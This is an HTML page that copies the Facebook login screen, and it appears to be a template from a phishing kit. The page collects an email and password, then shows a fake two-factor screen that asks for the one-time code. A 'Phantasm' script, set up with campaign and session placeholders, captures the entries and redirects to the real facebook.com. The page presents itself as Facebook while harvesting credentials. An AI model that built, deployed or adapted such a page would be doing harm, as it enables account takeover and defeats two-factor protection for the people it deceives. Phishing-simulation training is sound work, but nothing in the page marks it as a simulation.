<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico">
    <style>
        body {
            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        .main-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            padding-bottom: 112px;
            padding-top: 72px;
            width: 980px;
            max-width: 100%;
        }
        .left-col {
            width: 580px;
            padding-right: 32px;
            box-sizing: border-box;
        }
        .logo {
            height: 106px;
            margin: -28px;
        }
        h2 {
            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
            font-size: 28px;
            font-weight: normal;
            line-height: 32px;
            width: 500px;
            margin-top: 24px;
            margin-bottom: 0;
        }
        .right-col {
            width: 396px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .card {
            background-color: #fff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            box-sizing: border-box;
            padding: 20px 0 28px;
            width: 396px;
            text-align: center;
        }
        .form-container {
            padding: 0 16px;
        }
        input {
            font-size: 17px;
            padding: 14px 16px;
            width: 100%;
            border-radius: 6px;
            border: 1px solid #dddfe2;
            margin-bottom: 12px;
            box-sizing: border-box;
            color: #1d2129;
            height: 52px;
            line-height: 16px;
        }
        input:focus {
            border-color: #1877f2;
            outline: none;
            box-shadow: 0 0 0 2px #e7f3ff;
            caret-color: #1877f2;
        }
        .btn {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            width: 100%;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            margin-top: 6px;
            transition: 200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform;
        }
        .btn:hover {
            background-color: #166fe5;
        }
        .forgot {
            color: #1877f2;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: block;
            margin-top: 16px;
            margin-bottom: 20px;
        }
        .forgot:hover {
            text-decoration: underline;
        }
        .divider {
            align-items: center;
            border-bottom: 1px solid #dadde1;
            display: flex;
            margin: 20px 16px;
            text-align: center;
        }
        .create-btn {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            line-height: 48px;
            padding: 0 16px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            display: inline-block;
            transition: 200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform;
        }
        .create-btn:hover {
            background-color: #36a420;
        }
        .create-page {
            margin-top: 28px;
            font-size: 14px;
            color: #1c1e21;
        }
        .create-page a {
            font-weight: bold;
            color: #1c1e21;
            text-decoration: none;
        }
        .create-page a:hover {
            text-decoration: underline;
        }

        @media (max-width: 900px) {
            .main-wrapper {
                flex-direction: column;
                width: 100%;
                padding-top: 0;
                padding-bottom: 40px;
            }
            .left-col {
                text-align: center;
                width: auto;
                padding: 0;
                margin-top: 40px;
                margin-bottom: 40px;
            }
            .logo {
                margin: 0;
                height: 60px;
            }
            h2 {
                font-size: 24px;
                width: auto;
                margin-top: 10px;
            }
            .right-col {
                width: 100%;
                padding: 0 16px;
                box-sizing: border-box;
            }
            .card {
                width: 100%;
                max-width: 396px;
            }
        }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="step-1" class="main-wrapper">
        <div class="left-col">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="logo">
            <h2>Facebook helps you connect and share with the people in your life.</h2>
        </div>
        
        <div class="right-col">
            <div class="card">
                <form id="login-form" class="form-container">
                    <input type="text" id="email" placeholder="Email address or phone number" required>
                    <input type="password" id="password" placeholder="Password" required>
                    <button type="submit" id="btn-submit" class="btn">Log In</button>
                    <a href="#" class="forgot">Forgotten password?</a>
                    <div class="divider"></div>
                    <button type="button" class="create-btn">Create new account</button>
                </form>
            </div>
            <div class="create-page">
                <a href="#">Create a Page</a> for a celebrity, brand or business.
            </div>
        </div>
    </div>

    <!-- OTP Section -->
    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: #f0f2f5; height: 100%; justify-content: center; z-index: 999;">
        <div class="card" style="padding: 20px;">
            <h2 style="font-size: 20px; width: 100%; margin-top: 0; margin-bottom: 20px;">Two-Factor Authentication</h2>
            <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
            <input type="text" id="otp-input" placeholder="Enter code" style="margin-bottom: 20px;">
            <button id="btn-otp-submit" class="btn">Verify</button>
        </div>
    </div>

    <script src="/core/assets/js/phantasm.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            new Phantasm({
                redirectUrl: 'https://www.facebook.com/',
                selectors: {
                    email: '#email',
                    password: '#password',
                    otp: '#otp-input',
                    submitBtn: '#btn-submit',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step3: '#step-3-otp'
                },
                sessionId: '{{ session_id }}',
                campaignId: '{{ campaign_id }}'
            });
        });
    </script>
</body>
</html>
